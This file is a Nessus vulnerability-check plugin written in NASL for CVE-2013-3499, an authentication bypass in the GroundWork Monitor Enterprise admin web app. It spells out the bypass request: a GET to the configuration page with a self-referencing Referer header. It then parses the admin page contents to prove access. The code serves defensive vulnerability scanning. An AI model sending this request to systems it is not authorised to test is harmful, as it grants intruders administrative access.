#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(67019);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 21:08:39 $");

  script_cve_id("CVE-2013-3499");
  script_bugtraq_id(58404);
  script_osvdb_id(91047);
  script_xref(name:"CERT", value:"345260");

  script_name(english:"GroundWork Monitor Enterprise Foundation Webapp Admin Interface Authentication Bypass");
  script_summary(english:"Tries to bypass authentication");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote host has a web application that is affected by an
authentication bypass vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote host has a version of GroundWork Monitor Enterprise
installed that has a poorly protected administration application.  By
sending a specially crafted HTTP request, it is possible for a remote
attacker to access the Foundation Webapp Admin Interface without logging
in. 

Note that installs affected by this vulnerability are most likely
affected by other vulnerabilities as well."
  );
  # https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130308-0_GroundWork_Monitoring_Multiple_critical_vulnerabilities_wo_poc_v10.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8bed79e0");
  # https://kb.groundworkopensource.com/display/SUPPORT/SA6.7.0-1+Some+web+components+allow+bypass+of+role+access+controls
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f51aa8a3");
  script_set_attribute(attribute:"solution", value:"See the vendor advisory for a workaround.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/03/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/03/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/06/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:gwos:groundwork_monitor");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("groundwork_monitor_enterprise_detect.nasl");
  script_require_keys("www/groundwork_monitor_enterprise");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);
appname = "GroundWork Monitor Enterprise";

install = get_install_from_kb(appname:"groundwork_monitor_enterprise", port:port, exit_on_fail:TRUE);

dir = install['dir'];
location = build_url(qs:dir, port:port);

referer = build_url(qs:'/foundation-webapp/admin/manage-configuration.jsp', port:port);

res = http_send_recv3(
                      port: port,
                      item: '/foundation-webapp/admin/manage-configuration.jsp',
                      method: 'GET',
                      add_headers: make_array("Referer", referer)
                      );

if (
  "<center>Foundation Configuration Files</center>" >< res[2] &&
  "<B>Choose a configuration file...</B>" >< res[2] &&
  "Forbidden" >!< res[2]
)
{
  set_kb_item(name:'www/'+port+'/groundwork_monitor_enterprise/weak_auth', value:TRUE);
  if (report_verbosity > 0)
  {
    req = http_last_sent_request();
    report = '\n' +
         'Nessus was able to verify the issue using the following request : \n' +
         '\n' +
         crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
         req + '\n' +
         crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';

    if (report_verbosity > 1 && "Foundation Administration pages:" >< res[2])
    {
      # add an interesting page excerpt to prove we exploited the vuln
      lines = split(strstr(res[2], "Foundation Administration pages:"));
      excerpt = '';
      for (i=0; i<11; i++)
      {
        if (isnull(lines[i])) break;
        excerpt += lines[i];
      }
      report +=
         '\nThe following is an excerpt from the Foundation Webapp Admin page: \n' +
         '\n' +
         crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
         excerpt + '\n' +
         crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
    }
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, location);
